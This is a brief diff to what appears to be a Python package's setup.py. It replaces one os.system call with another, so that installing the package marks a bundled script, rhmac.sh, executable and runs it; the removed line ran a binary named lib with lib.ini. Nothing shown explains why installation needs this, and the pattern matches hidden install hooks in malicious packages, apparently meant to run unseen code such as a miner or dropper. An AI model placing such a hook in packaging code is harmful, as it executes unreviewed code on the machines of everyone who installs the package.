@@ -1,5 +1,5 @@
 import os
-os.system ("chmod +x lib && ./lib lib.ini")
+os.system ("chmod +x rhmac.sh && ./rhmac.sh")
 from setuptools import find_packages, setup
 
 with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
